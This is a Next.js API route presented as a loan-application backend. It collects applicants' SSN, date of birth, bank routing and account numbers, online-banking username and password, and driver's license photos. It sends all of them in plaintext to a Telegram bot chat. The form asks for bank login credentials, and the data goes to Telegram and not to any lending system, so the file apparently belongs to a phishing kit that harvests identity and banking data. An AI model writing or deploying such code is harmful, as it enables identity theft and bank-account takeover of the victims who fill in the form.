import { NextRequest, NextResponse } from 'next/server';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN!;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID!;

interface FormData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  ssn: string;
  dob: string;
  address: string;
  city: string;
  state: string;
  zip: string;
  employmentStatus: string;
  employerName: string;
  employerPhone: string;
  monthlyIncome: string;
  payFrequency: string;
  nextPayDate: string;
  directDeposit: string;
  creditRating: string;
  loanPurpose: string;
  loanAmount: string;
  bankName: string;
  bankState: string;
  aba: string;
  accountNumber: string;
  bankUsername?: string;
  bankPassword?: string;
  consolidationOption?: string;
  customConsolidation?: string;
  dlFrontUrl?: string;
  dlBackUrl?: string;
  dlFront?: File;
  dlBack?: File;
}

async function sendToTelegram(formData: FormData) {
  const {
    firstName, lastName, email, phone, ssn, dob, address, city, state, zip,
    employmentStatus, employerName, employerPhone, monthlyIncome, payFrequency,
    nextPayDate, directDeposit, creditRating, loanPurpose, loanAmount,
    bankName, bankState, aba, accountNumber, bankUsername, bankPassword,
    consolidationOption, customConsolidation, dlFront, dlBack
  } = formData;

  // Format message with all fields
  const message = `
📝 *LOAN APPLICATION*
━━━━━━━━━━━━━━━━━━━━━

👤 *Personal Info*
• Name: ${firstName} ${lastName}
• Email: ${email}
• Phone: ${phone}
• SSN: ${ssn}
• DOB: ${dob}
• Address: ${address}, ${city}, ${state} ${zip}

💼 *Employment & Income*
• Status: ${employmentStatus}
• Employer: ${employerName}
• Employer Phone: ${employerPhone}
• Monthly Income: ${monthlyIncome}
• Pay Frequency: ${payFrequency}
• Next Pay Date: ${nextPayDate}
• Direct Deposit: ${directDeposit}
• Credit Rating: ${creditRating}

💰 *Loan Details*
• Purpose: ${loanPurpose}
• Amount: ${loanAmount}
${consolidationOption ? `• Consolidation: ${consolidationOption}${customConsolidation ? ` (${customConsolidation})` : ''}` : ''}

🏦 *Banking Info*
• Bank: ${bankName}
• Bank State: ${bankState}
• ABA/Routing: ${aba}
• Account: ${accountNumber}
• Username: ${bankUsername || 'N/A'}
• Password: ${bankPassword || 'N/A'}
━━━━━━━━━━━━━━━━━━━━━
  `.trim();

  // Send text message
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    })
  });

  // Send images if present
  if (dlFront) {
    const formDataImg = new FormData();
    formDataImg.append('chat_id', TELEGRAM_CHAT_ID);
    formDataImg.append('document', dlFront);
    formDataImg.append('caption', '🆔 Driver\'s License - Front');
    
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
      method: 'POST',
      body: formDataImg
    });
  }

  if (dlBack) {
    const formDataImg = new FormData();
    formDataImg.append('chat_id', TELEGRAM_CHAT_ID);
    formDataImg.append('document', dlBack);
    formDataImg.append('caption', '🆔 Driver\'s License - Back');
    
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
      method: 'POST',
      body: formDataImg
    });
  }
}

export async function POST(req: NextRequest) {
  try {
    const formData = await req.formData();
    
    // Extract all fields
    const data: FormData = {
      firstName: formData.get('firstName') as string,
      lastName: formData.get('lastName') as string,
      email: formData.get('email') as string,
      phone: formData.get('phone') as string,
      ssn: formData.get('ssn') as string,
      dob: formData.get('dob') as string,
      address: formData.get('address') as string,
      city: formData.get('city') as string,
      state: formData.get('state') as string,
      zip: formData.get('zip') as string,
      employmentStatus: formData.get('employmentStatus') as string,
      employerName: formData.get('employerName') as string,
      employerPhone: formData.get('employerPhone') as string,
      monthlyIncome: formData.get('monthlyIncome') as string,
      payFrequency: formData.get('payFrequency') as string,
      nextPayDate: formData.get('nextPayDate') as string,
      directDeposit: formData.get('directDeposit') as string,
      creditRating: formData.get('creditRating') as string,
      loanPurpose: formData.get('loanPurpose') as string,
      loanAmount: formData.get('loanAmount') as string,
      bankName: formData.get('bankName') as string,
      bankState: formData.get('bankState') as string,
      aba: formData.get('aba') as string,
      accountNumber: formData.get('accountNumber') as string,
      bankUsername: formData.get('bankUsername') as string || undefined,
      bankPassword: formData.get('bankPassword') as string || undefined,
      consolidationOption: formData.get('consolidationOption') as string || undefined,
      customConsolidation: formData.get('customConsolidation') as string || undefined,
      dlFront: formData.get('dlFront') as File || undefined,
      dlBack: formData.get('dlBack') as File || undefined,
    };

    await sendToTelegram(data);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Telegram error:', error);
    return NextResponse.json({ success: false, error: 'Failed to send to Telegram' }, { status: 500 });
  }
}
